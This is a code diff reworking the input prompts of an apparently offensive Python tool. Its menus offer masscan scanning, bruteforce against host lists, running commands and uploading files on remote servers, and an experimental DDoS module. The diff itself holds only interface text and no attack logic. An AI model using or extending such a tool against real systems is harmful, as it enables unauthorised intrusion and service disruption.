@@ -49,25 +49,20 @@ def show_menu(msg=None):
 
 
 def masscan_start_msg():
-    print('Input ip or path to file with hosts:')
-    ip = input('> ')
-
-    print('Input port/s (ex. 80 or 80,8080,22)')
-    port = input('> ')
-
+    ip = input('[*] Input ip or path to file with hosts: ')
+    port = input('[*] Input port/s (ex. 80 or 80,8080,22): ')
     subprocess.run(['clear'])
 
     return ip, port
 
 
 def bruteforce_start_msg(files_names):
-    print('Available list of files for bruteforce.')
+    print('Available list of files for bruteforce.\n')
 
     for i in range(len(files_names)):
-        print(f'{i}. {files_names[i]}', '\n')
+        print(f'{i}. {files_names[i]}')
 
-    print('Choose file with hosts from current list. (enter num)')
-    choice = input('> ')
+    choice = input('\n[*] Choose file with hosts from current list. (enter num): ')
     subprocess.run(['clear'])
 
     return choice
@@ -91,8 +86,7 @@ def send_command_start_msg():
 3. Upload file to remote servers.
 4. Run DDos.  (experimental module)     
 """
-    print(msg)
-    choice = input('> ')
+    choice = input(f'{msg}: ')
     subprocess.run(['clear'])
 
     return choice
@@ -104,12 +98,9 @@ def send_command_custom_cmd(dirs_lst):
     for i in range(len(dirs_lst)):
         print(f'{i}. {dirs_lst[i]}', '\n')
 
-    print('Choose directory:')
-    choice = input('> ')
-    print('Input your command:')
-    cmd = input('> ')
-    print('Is response logging required? Y/n')
-    log = input('> ')
+    choice = input('\n[*] Choose directory: ')
+    cmd = input('[*] Input your command: ')
+    log = input('[*] Is response logging required? [Y/n]')
     subprocess.run(['clear'])
 
     return choice, cmd, log
